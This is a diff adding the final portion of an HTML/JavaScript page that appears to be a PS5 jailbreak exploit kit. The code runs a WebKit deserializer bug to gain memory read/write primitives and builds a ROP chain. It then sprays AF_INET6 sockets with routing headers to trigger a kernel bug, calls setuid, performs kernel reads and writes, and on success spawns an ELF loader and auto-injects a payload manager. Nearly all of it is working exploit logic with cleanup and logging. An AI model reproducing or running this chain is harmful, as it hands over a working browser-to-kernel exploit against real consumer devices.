+                row(k + 1, LADDER[k], "SKIP", "REFUSED after '" + entry.key
+                    + "' failed");
+            }
+            break;
+        }
+    }
+
+    let reportRow = null;
+    for (const e of LADDER) if (e.key === "ps7_report") reportRow = e;
+    const reportIdx = reportRow ? LADDER.indexOf(reportRow) + 1 : 0;
+    let reportResult = null;
+    if (reportRow && chainDead) {
+        skipped++;
+        row(reportIdx, reportRow, "SKIP", "IMPOSSIBLE -- the chain died at '"
+            + chainDead + "'");
+    } else if (reportRow && !engine) {
+        skipped++;
+        row(reportIdx, reportRow, "SKIP", "no engine was built");
+    } else if (reportRow && !cleanupClaimed) {
+        cleanupClaimed = true;
+        currentKey = "ps7_report";
+        currentNotes = [];
+        flushMark("TEST-ENTER", "ps7_report-forced");
+        try {
+            reportResult = await reportRow.run();
+        } catch (err) {
+            reportResult = FAIL("PS7 THREW: " + ((err && err.message) || err));
+        }
+        row(reportIdx, reportRow, reportResult.status, reportResult.detail,
+            currentNotes);
+        if (reportResult.status === "PASS") passed++; else failed++;
+        flushMark("TEST", "ps7_report-" + reportResult.status);
+    }
+
+    let stranded = [];
+    const noClose = (engine && engine.S && engine.S.doNotClose)
+        ? engine.S.doNotClose : new Set();
+    const sweepBlocked = engine && engine.corrupt ? "alias-present"
+        : (engine && engine.triggered ? "trigger-fired"
+            : (chainDead ? "chain-dead"
+                : (state.cleanupFailed ? "cleanup-failed"
+                    : ((engine && engine.S && engine.S.groupsStillLive.length)
+                        ? "racer-group-still-parked" : ""))));
+    const sweepable = Array.from(state.fdOpen).filter(fd => !noClose.has(fd));
+    if (sweepable.length && !sweepBlocked) {
+        for (const fd of sweepable) {
+            try { await sys(0x006, fd); } catch { }
+            state.fdOpen.delete(fd);
+        }
+        flushMark("FD-SWEEP", "closed=" + sweepable.length + "-skipped="
+            + noClose.size + "-fds=" + sweepable.slice(0, 24).join("."));
+    } else if (sweepable.length) {
+        flushMark("FD-STRANDED", "n=" + sweepable.length + "-why=" + sweepBlocked
+            + "-fds=" + sweepable.slice(0, 24).join("."));
+    }
+
+    const strandSet = new Set(noClose);
+    for (const fd of state.fdOpen) strandSet.add(fd);
+    stranded = Array.from(strandSet);
+    if (noClose.size)
+        flushMark("FD-DO-NOT-CLOSE", "n=" + noClose.size + "-fds="
+            + Array.from(noClose).slice(0, 24).join("."));
+
+    currentKey = "";
+
+    const rt = state.roundTrips;
+    const rtMean = rt.length
+        ? Math.round(rt.reduce((a, b) => a + b, 0) / rt.length * 10) / 10 : -1;
+    const rtMax = rt.length ? Math.max.apply(null, rt) : -1;
+
+    tallyEl.textContent = passed + " PASS   " + failed + " FAIL   "
+        + skipped + " SKIP" + (filtered ? "   " + filtered + " FILTERED" : "");
+    tallyEl.style.color = failed ? "#e05561" : "#47c76a";
+
+    const v = (ctx.measured && ctx.measured.verdict) || null;
+    const mustReboot = v ? !!v.reboot : true;
+    const lines = [];
+    lines.push("rows: " + LADDER.length + " = " + passed + " pass + " + failed
+        + " fail + " + skipped + " skip + " + filtered + " filtered");
+    if (engine) {
+        lines.push("TRIGGER: " + cfg.trigger
+            + (cfg.trigger === "overflow" ? " (burn=" + cfg.burn + ")" : "")
+            + "   |   fired: " + (engine.triggered ? "YES -- " + engine.triggered
+                : "no")
+            + "   |   alias observed: " + (engine.corrupt ? "YES" : "no")
+            + "   |   triplet: " + (engine.TW.tripletsValid()
+                ? engine.TW.S.triplets.join(",") : "none"));
+        lines.push("crfrees issued: " + engine.S.crfrees
+            + "   |   setuid(1) calls: " + engine.S.setuidCalls
+            + "   |   kread_slow: " + engine.S.kreadOk + " ok of "
+            + engine.S.kreadCalls
+            + "   |   kqueues opened/closed: " + engine.S.kqueuesOpened + "/"
+            + engine.S.kqueuesClosed
+            + "   |   kernel writes: " + engine.kernelWrites);
+        if (engine.S.masterPipeData)
+            lines.push("STAGE 2 OUTPUT (printed and discarded; stage 3's input, " + "and stage 3 is not built): master_pipe and victim_pipe are " + "in the PS6 row above and in the beacon log");
+    }
+    if (ctx && ctx.measured.rt)
+        lines.push("MEASURED chain.run(): " + ctx.measured.rt.a.toFixed(2)
+            + " ms fixed + " + (ctx.measured.rt.b * 1000).toFixed(1)
+            + " us per in-chain syscall.");
+    if (ctx && ctx.measured.stage0)
+        lines.push("STAGE 0: " + ctx.measured.stage0.attempts + " attempts in "
+            + ctx.measured.stage0.ms + " ms = "
+            + (ctx.measured.stage0.ms
+                / Math.max(1, ctx.measured.stage0.attempts)).toFixed(0)
+            + " ms/attempt.");
+    lines.push("chain round trips: " + rt.length + ", mean " + rtMean
+        + " ms, worst " + rtMax + " ms; one-at-a-time syscalls " + syscallCount
+        + "; errno convention (measured): " + errConvention);
+    lines.push("threads: " + state.threadsCreated + " created, "
+        + state.threadsExited + " confirmed exited"
+        + (state.tornWrites.length
+            ? "; torn slot writes: " + state.tornWrites.join(",") : ""));
+    if (stranded.length)
+        lines.push("descriptors left open on purpose ("
+            + (sweepBlocked ? "sweep blocked: " + sweepBlocked + "; " : "")
+            + noClose.size + " named by cleanup as do-not-close, "
+            + state.fdOpen.size + " still tracked): "
+            + stranded.join(",") + "");
+    lines.push("not built, DELIBERATELY: stage 3 and everything after it");
+    if (aborted) lines.push("run stopped at '" + aborted + "'.");
+    if (FILTERED_RUN)
+        lines.push("this was A filtered pass ("
+            + (ONLY.length ? "?only=" + ONLY.join(",") : "?from=" + FROM)
+            + "). It can only account for what IT did.");
+    summaryEl.textContent = lines.join("\n");
+
+    flushMark("POOPS-COMPLETE", "pass=" + passed + "-fail=" + failed
+        + "-skip=" + skipped + "-reboot=" + (mustReboot ? 1 : 0)
+        + "-triggered=" + (engine && engine.triggered ? 1 : 0)
+        + "-rtmean=" + rtMean + "-filtered=" + (FILTERED_RUN ? 1 : 0));
+
+    const payloadSuccess = cfg.payload === "1" && elfldrSpawned;
+    const fullSuccess = payloadSuccess || (failed === 0 && !aborted
+        && !FILTERED_RUN && !chainDead && !state.cleanupFailed);
+
+    if (fullSuccess) {
+        clearFailureBanners();
+        setCatResult(true);
+        showVerdict(false, payloadSuccess
+            ? "ELF LOADER READY -- returning to the payload menu."
+            : "SUCCESS -- all executed checks passed."
+                + (mustReboot
+                    ? "\n\nThe jailbreak changed this boot's kernel state; reboot before running it again."
+                    : "\n\nCleanup completed and the run may be repeated safely."));
+    } else if (mustReboot) {
+        setCatResult(false);
+        showVerdict(true, (v ? v.text : "reboot now -- the state report and "
+            + "cleanup row (PS7) never ran"
+            + (chainDead ? ", because the ROP chain died at '" + chainDead
+                + "'"
+                : ", so nothing has been verified and this page cannot claim "
+                + "anything was put back."))
+            + "\n\nREBOOT NOW"
+            + (v && v.all.length > 1
+                ? "\n\nAll reasons:\n  - " + v.all.join("\n  - ") : ""));
+    } else {
+
+        const ver = (v && v.verified) || {};
+        setCatResult(false);
+        showVerdict(false, "you are fine -- nothing was triggered and " + "everything this page can check was put back.\n"
+            + (ver.teardown ? "freed and closed socket by socket"
+                : "teardown had nothing to do")
+            + "; racers " + (ver.racers ? "confirmed exited" : "NOT confirmed")
+            + "; scheduler affinity "
+            + (ver.schedAff ? "read back" : "NOT read back")
+            + " and priority " + (ver.schedPrio ? "read back" : "NOT read back")
+            + "; descriptors left open on purpose: " + stranded.length
+            + "; kernel writes: " + (ver.kernelWrites === undefined
+                ? "0" : ver.kernelWrites) + ".");
+    }
+
+    const finalLatch = await latch.read();
+    if (!mustReboot && !failed && !aborted && !FILTERED_RUN && !stranded.length
+        && !chainDead && !state.cleanupFailed) {
+        const l = await latch.clear();
+        flushMark("LATCH-RELEASED", "set=" + (l.set ? 1 : 0));
+        lines.push("one-shot latch RELEASED: this run put everything back and "
+            + "verified it.");
+    } else {
+        flushMark("LATCH-HELD", "reboot=" + mustReboot + "-failed=" + failed
+            + "-aborted=" + (aborted || "no") + "-filtered=" + FILTERED_RUN);
+        lines.push("ONE-shot latch still held"
+            + (finalLatch.set ? "" : " (or never took)")
+            + "");
+    }
+    summaryEl.textContent = lines.join("\n");
+
+    if (!aborted && !FILTERED_RUN) storeDel(PROGRESS_KEY);
+    storeSet(RUNLOG_KEY, JSON.stringify({
+        v: 1, rev: REV, ts: Date.now(),
+        trigger: cfg.trigger, burn: cfg.burn,
+        stoppedAt: aborted || "", filtered: FILTERED_RUN,
+        pass: passed, fail: failed, skip: skipped,
+        reboot: mustReboot,
+        triggered: engine ? engine.triggered : "",
+        corrupt: engine ? engine.corrupt : "",
+        triplets: engine && engine.TW.tripletsValid()
+            ? engine.TW.S.triplets.join(",") : "",
+        setuidCalls: engine ? engine.S.setuidCalls : 0,
+        socketsLeft: engine ? engine.TW.S.n : 0,
+        chainDead: chainDead, cleanupFailed: state.cleanupFailed,
+        latchDetail: (finalLatch && finalLatch.detail) || ""
+    }));
+
+    if (payloadSuccess)
+        stage("ELF LOADER READY -- auto-injecting Payload Manager", "ok");
+    else if (fullSuccess)
+        stage("SUCCESS -- " + passed + " PASS / 0 FAIL", "ok");
+    else if (mustReboot)
+        stage("reboot required -- " + passed + " PASS / " + failed + " FAIL", "bad");
+    else if (failed || aborted)
+        stage("FAILED -- " + passed + " PASS / " + failed + " FAIL", "bad");
+    else
+        stage("stages 0-2 complete, nothing triggered, everything put back -- "
+            + passed + " PASS", "ok");
+
+    if (payloadSuccess) {
+        flushMark("ELFLDR-MENU-INPAGE",
+            "no-navigation-parked-racers-and-fds-remain-owned-port=9021");
+        showPayloadMenu();
+        autoInjectpldmgr();
+    }
+}
+
+async function bootChain() {
+    const bootTimer = setTimeout(() => {
+        flushMark("BOOT-STALLED", "ms=45000-stage=boot-nothing-changed-yet");
+        stage("boot is taking more than 45 s");
+    }, 45000);
+    try {
+        stage("preflight");
+        await preflight();
+        refuseReferenceChain();
+        await bootPrimitiveAndChain();
+    } finally {
+        clearTimeout(bootTimer);
+    }
+}
+
+async function bootPrimitiveAndChain() {
+    if (globalThis.p && typeof globalThis.p.read8 === "function") {
+        flushMark("PRIMITIVE-REUSED", "window.p was already published");
+    } else if (typeof window.jbReady === "object" && window.jbReady !== null
+        && typeof window.jbReady.then === "function") {
+        stage("waiting for the primitive");
+        await window.jbReady;
+        flushMark("PRIMITIVE-REUSED", "via-window.jbReady");
+    } else if (typeof window.run_slopkit === "function") {
+        stage("running slopkit's deserializer bug through window.run_slopkit");
+        await window.run_slopkit(window.fw_str);
+        flushMark("PRIMITIVE-REUSED", "via-window.run_slopkit");
+    } else {
+        stage("running the webkit bug -- placement is ~1 attempt in 3, it "
+            + "retries itself");
+
+        // A killed/reloaded WebProcess can restore this history entry with the
+        // previous 65k-object SerializedScriptValue graph still attached.  If
+        // we build the next graph before releasing it, 9.00 can hit its memory
+        // ceiling almost immediately.  Purge it before any exploit allocation.
+        flushMark("PRIMITIVE-HISTORY-PURGE-PRE", "replace-state-null");
+        try {
+            history.replaceState(null, "");
+        } catch (e) {
+            flushMark("PRIMITIVE-HISTORY-PURGE-FAIL",
+                (e && e.name ? e.name : "Error") + ":" + String(e && e.message || e));
+            throw e;
+        }
+        if (typeof globalThis.gc === "function") {
+            try { globalThis.gc(); } catch (e) { }
+        }
+        await new Promise(resolve => setTimeout(resolve, 750));
+        flushMark("PRIMITIVE-HISTORY-PURGED", "settled-ms=750");
+
+        const carrier = await establishPrimitive({
+            maxAttempts: MAX_ATTEMPTS,
+            onEvent(tag, detail, attempt) {
+                if (tag === "ATTEMPT-START") {
+                    // This is before the large graph is built, so make the
+                    // checkpoint durable if the WebProcess dies during setup.
+                    flushMark(tag, detail);
+                    stage("exploit attempt " + attempt + " -- waiting for placement");
+                } else {
+                    queueEvent(tag, detail);
+                }
+            },
+            beforeCriticalLoad(fake, target) {
+                queueEvent("CRITICAL-LOAD-NEXT", "fake=0x" + fake.toString(16)
+                    + "-target=0x" + target.toString(16));
+                void scrEl.offsetWidth;
+                flushQueue(false);
+            }
+        });
+        nogcHard.carrier = carrier;
+        installWindowP(carrier, { onEvent: queueEvent });
+        // installWindowP() promotes the primitive to a self-contained pair of
+        // real typed arrays.  Keeping the obsolete fake carrier here defeats
+        // core.js's release and can retain the 72 MB addrof carrier graph.
+        nogcHard.carrier = null;
+        if (typeof globalThis.gc === "function") {
+            try { globalThis.gc(); } catch (e) { }
+        }
+        // Give JSC an idle turn to reclaim the released carrier/groom before
+        // prepare() creates its worker ROP stack and the kernel-stage arenas.
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        flushMark("PRIMITIVE-MEMORY-RELIEF",
+            "fake-carrier-dropped=1-history-state-null="
+            + (history.state === null));
+        // The landing page preloads the small UI image so it remains visually
+        // stable while this page transitions into its live log view.
+        flushMark("PRIMITIVE-UP", "attempt=" + carrier.attempts
+            + "-paired=" + pairStatus.promoted
+            + "-released=" + fakeCellReleased());
+        if (!pairStatus.promoted)
+            throw new Error("the (main, worker) pair was NOT promoted ("
+                + pairStatus.error + ")");
+    }
+
+    const p = globalThis.p;
+    if (!p || typeof p.read8 !== "function")
+        throw new Error("window.p was never published");
+    nogcHard.p = p;
+    assertInt64Identity();
+
+    stage("loading poops_lib / threads_lib / twin_lib / poops_stages");
+    await loadPoopsModules();
+
+    const handoff = window.jbPrepared || null;
+    let prepared;
+    if (handoff && handoff.chain && handoff.p
+        && typeof handoff.chain.syscall === "function"
+        && handoff.p.syscalls !== undefined) {
+        prepared = handoff;
+        flushMark("CHAIN-REUSED", "window.jbPrepared");
+    } else {
+        stage("prepare(): module bases, gadget/syscall tables, worker hijack");
+        flushMark("PREP-ENTER", "");
+        prepared = await prepare(p);
+        flushMark("PREP-OK", "getpid-passed-inside-prepare");
+    }
+    P = prepared.p;
+    chain = prepared.chain;
+    nogcHard.chain = chain;
+
+    flushMark("POST-PREP", "next=assertBases");
+    assertBases();
+    await probeErrnoConvention();
+}
+
+async function main() {
+    flushMark("POOPS-BOOT", "rev=" + REV + "-trigger=" + cfg.trigger
+        + "-burn=" + cfg.burn + "-sockets=" + cfg.sockets
+        + "-attempts=" + cfg.attempts + "-from=" + (FROM || "none")
+        + "-only=" + (ONLY.join(".") || "none")
+        + "-stalledAt=" + (STALLED_AT || "none"));
+    lockNav(true);
+    runInFlight = true;
+    try {
+        await bootChain();
+
+        await chooseCore();
+
+        makeContext();
+        const self = await engine.H.thrSelf("driver");
+        driver.tid = self.tid;
+        const r0 = await engine.H.readRtprio("driver-original");
+        driver.origPrioType = r0.type;
+        driver.origPrio = r0.prio;
+        const pid = await sys(0x014);
+        driver.pid = pid.failed ? 0 : pid.s32;
+        flushMark("DRIVER-IDENTITY", "pid=" + driver.pid + "-tid=" + driver.tid
+            + "-mask=" + driver.origMaskHex + "-rtprio=" + driver.origPrioType
+            + "/" + driver.origPrio + "-core=" + driver.core);
+
+        flushMark("PRE-FD-BASELINE", "next=socket(AF_UNIX,SOCK_STREAM)");
+        const first = await sys(0x061, K.AF_UNIX, K.SOCK_STREAM, 0);
+        if (!first.failed) {
+            state.fdBaseline = first.s32;
+            await sys(0x006, state.fdBaseline);
+        }
+        flushMark("FD-BASELINE", "fd=" + state.fdBaseline);
+
+        vitals(vitalsText("about to open "));
+        cfgEl.textContent =
+            "trigger: " + cfg.trigger
+            + (cfg.trigger === "overflow" ? "   burn: " + cfg.burn : "")
+            + "   |   stage-0 attempts: " + cfg.attempts
+            + "   |   twin scan: " + (PK ? PK.MAX_ROUNDS_TWIN : 10)
+            + " rounds at BATCH 1 (twin_lib REFUSES batch>1 once a trigger "
+            + "exists)\n"
+            + "spray bank: " + cfg.sockets + " AF_INET6 sockets x 360-byte "
+            + "type-0 routing header (poops.c:38, :45)\n"
+            + "target core " + driver.core + " -- " + driver.coreWhy + "\n"
+            + "driver tid " + (driver.tid || "unknown") + " in pid " + driver.pid
+            + "; will put back mask " + driver.origMaskHex + " and rtprio "
+            + driver.origPrioType + "/" + driver.origPrio + "\n" + "chain watchdog " + WATCHDOG_MS + " ms per round trip; every loop " + "on this page is bounded by an iteration count AND a wall clock, " + "and every wait has a deadline.\n";
+
+        stage("running the ladder -- one row at a time");
+        try {
+            await runLadder();
+        } finally {
+            if (chainDead)
+                danger("cleanup impossible: the ROP chain died at '" + chainDead
+                    + "'.\nUp to " + (engine ? engine.TW.S.n : 0) + " AF_INET6 "
+                    + "sockets, their 360-byte kernel routing headers, twelve "
+                    + "realtime kernel threads pinned to core " + driver.core
+                    + ", and this WebProcess's raised fd limit are all still " + "live, and NOTHING in a later page load can reach a " + "descriptor or a thread in a process it does not own"
+                    + (driver.tid
+                        ? "\nThe driver thread is tid " + driver.tid + " in pid "
+                        + driver.pid + " and that has been written down: a " + "later load CAN restore its affinity and priority by " + "explicit TID"
+                        : "")
+                    + "\nREBOOT.");
+        }
+    } finally {
+        runInFlight = false;
+        lockNav(false);
+    }
+}
+
+async function clearMain() {
+    const before = await latch.read();
+    const after = await latch.clear();
+    stage(before.set
+        ? "one-shot latch CLEARED. It was set by: " + (before.detail || "?")
+        : "the latch was not set; nothing to clear.", "ok");
+    summaryEl.textContent =
+        "before: " + JSON.stringify(before) + "\nafter:  " + JSON.stringify(after)
+        + (ARMED ? "\n\n?go=1 was present on this URL and was IGNORED: ?clear=1 "
+            + "is checked first and returns." : "")
+        + "\n\nNOTHING else was done";
+    renderNav(STALLED_AT, false);
+}
+
+function renderNav() {
+    navEl.textContent = "";
+    navEl.style.display = "none";
+}
+
+function lastRunText() {
+    if (!LAST_RUN) return "";
+    const age = Math.round((Date.now() - (LAST_RUN.ts || 0)) / 1000);
+    return "\nLAST recorded run (" + age + " s ago, trigger=" + LAST_RUN.trigger
+        + "): " + (LAST_RUN.stoppedAt ? "stopped at '" + LAST_RUN.stoppedAt + "'"
+            : "completed")
+        + ", " + LAST_RUN.pass + " pass / " + LAST_RUN.fail + " fail"
+        + (LAST_RUN.reboot ? "\n  that run'S verdict was: REBOOT." : "")
+        + (LAST_RUN.triggered ? "\n  the trigger fired: " + LAST_RUN.triggered
+            : "")
+        + (LAST_RUN.corrupt ? "\n  an alias was observed: " + LAST_RUN.corrupt
+            : "")
+        + (LAST_RUN.triplets ? "\n  triplet established: " + LAST_RUN.triplets
+            : "")
+        + (LAST_RUN.setuidCalls ? "\n  setuid(1) was called "
+            + LAST_RUN.setuidCalls + " time(s) -- IRREVERSIBLE for that boot, "
+            + "so the trigger's own precondition (a fresh, singly-referenced "
+            + "cred) no longer holds in that WebProcess" : "")
+        + (LAST_RUN.chainDead ? "\n  chain died at '" + LAST_RUN.chainDead + "'"
+            : "")
+        + (LAST_RUN.latchDetail ? "\n  latch detail recorded by that run: "
+            + LAST_RUN.latchDetail : "");
+}
+
+(async function entry() {
+
+    screenLine("slopkit -- reading the one-shot safety latch");
+
+    if (CLEARLATCH) {
+        renderNav("", false);
+        await clearMain();
+        return;
+    }
+
+    stage("checking the one-shot safety latch");
+    const l = await latch.read();
+    flushMark("LATCH-READ", "set=" + (l.set ? 1 : 0)
+        + "-detail=" + clean(l.detail || ""));
+
+    // ?auto=1 clears the latch instead of asking; reboot between runs
+    if (l.set && AUTOCLEAR) {
+        flushMark("LATCH-AUTOCLEAR", clean(l.detail || ""));
+        await latch.clear();
+        stage("latch was set and ?auto=1 cleared it, set by: "
+            + (l.detail || "(no detail)")
+            + "\nassumes the console has been rebooted since that run.");
+        l.set = false;
+    }
+
+    if (l.set) {
+        renderNav(STALLED_AT, true);
+        stage("the one-shot latch is set, by: " + (l.detail || "(no detail)")
+            + "\n\nre-arming is only safe after a run that failed in the " + "prologue: setuid(1) is irreversible for the boot and the trigger " + "needs a fresh singly-referenced cred");
+        summaryEl.textContent = lastRunText();
+        flushMark("POOPS-LATCHED", clean(l.detail || ""));
+        return;
+    }
+
+    if (!ARMED) {
+        document.getElementById("arm").hidden = false;
+        renderNav(STALLED_AT, false);
+        stage("not armed" + (STALLED_AT ? " -- and the last run stopped at '"
+            + STALLED_AT + "'" : ""));
+        vitals(vitalsText("if armed with ?go=1 this page will open "));
+
+        if (cfg.trigger !== "none"
+            && !(cfg.trigger === "overflow" && cfg.burn !== "full")) {
+            showVerdict(true, "this selection will leave the console needing A " + "REBOOT.\n");
+            navEl.textContent = "";
+            link("?go=1&trigger=" + cfg.trigger
+                + (cfg.trigger === "overflow" ? "&burn=" + cfg.burn : ""),
+                "ARM  " + cfg.trigger.toUpperCase()
+                + (cfg.trigger === "overflow" ? " / BURN=" + cfg.burn : "")
+                + "  -- I accept that this console will need A REBOOT",
+                "one hot");
+
+            link("?trigger=none", "no -- go back to the negative control",
+                "extra");
+            link("../index.html", "back to PS5-JB", "extra");
+        }
+        summaryEl.textContent = lastRunText()
+            + "\n\nSAME-process re-arm checks, and their limit stated honestly: " + "this page records the first socket fd it is given and the " + "process's uid, and can therefore notice that THIS WebProcess has " + "already run";
+        flushMark("POOPS-IDLE", "rev=" + REV + "-armed=0-trigger=" + cfg.trigger);
+        return;
+    }
+
+    if (STALLED_AT && !FROM && !ONLY.length) {
+
+        renderNav(STALLED_AT, false);
+        stage("the last run stopped at '" + STALLED_AT + "' but the latch is "
+            + "clear, so pick a row explicitly", "bad");
+        summaryEl.textContent = lastRunText();
+        flushMark("POOPS-STALLED", STALLED_AT);
+        return;
+    }
+
+    renderNav("", false);
+    main().catch(err => {
+        const m = (err && err.message) || String(err);
+        stage("boot failed: " + m, "bad");
+        flushMark("POOPS-FAILED", (err && err.name) + ":" + m.slice(0, 160));
+        runInFlight = false;
+        lockNav(false);
+    });
+})();
+</script>
+</body>
+</html>
